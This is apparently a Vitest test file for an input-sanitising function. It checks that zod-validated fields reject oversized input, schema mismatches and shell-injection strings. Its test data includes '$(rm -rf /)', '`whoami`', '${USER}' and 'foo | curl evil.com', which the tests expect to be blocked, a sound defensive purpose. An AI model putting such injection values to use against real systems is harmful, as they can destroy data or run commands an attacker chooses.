import { z } from 'zod'
import { describe, expect, it } from 'vitest'

import { sanitize } from '../sanitize'


describe('sanitize', () => {
  const schema = z.object({
    name: z.string().min(1).max(100),
    age: z.number().int().nonnegative().optional(),
  })

  it('accepts valid input', () => {
    const result = sanitize(schema, { name: 'Alice', age: 30 })
    expect(result.ok).toBe(true)
    if (result.ok) {
      expect(result.value.name).toBe('Alice')
    }
  })

  it('rejects shell command substitution patterns', () => {
    const result = sanitize(schema, { name: '$(rm -rf /)' })
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.code).toBe('BLOCKED_PATTERN')
    }
  })

  it('rejects backtick command substitution', () => {
    const result = sanitize(schema, { name: '`whoami`' })
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.code).toBe('BLOCKED_PATTERN')
    }
  })

  it('rejects ${} substitution', () => {
    const result = sanitize(schema, { name: '${USER}' })
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.code).toBe('BLOCKED_PATTERN')
    }
  })

  it('rejects shell pipe chains', () => {
    const result = sanitize(schema, { name: 'foo | curl evil.com' })
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.code).toBe('BLOCKED_PATTERN')
    }
  })

  it('rejects oversized input', () => {
    const huge = 'a'.repeat(70 * 1024)
    const result = sanitize(schema, { name: huge })
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.code).toBe('TOO_LARGE')
    }
  })

  it('returns INVALID_INPUT for schema mismatch', () => {
    const result = sanitize(schema, { name: 123 })
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.code).toBe('INVALID_INPUT')
    }
  })

  it('redacts schema details in error message but lists path', () => {
    const result = sanitize(schema, { name: '' })
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.message).toContain('name')
    }
  })

  it('scans nested arrays and objects for blocked patterns', () => {
    const nestedSchema = z.object({ items: z.array(z.object({ tag: z.string() })) })
    const result = sanitize(nestedSchema, { items: [{ tag: 'safe' }, { tag: '$(evil)' }] })
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.error.code).toBe('BLOCKED_PATTERN')
      expect(result.error.message).toContain('items[1].tag')
    }
  })
})
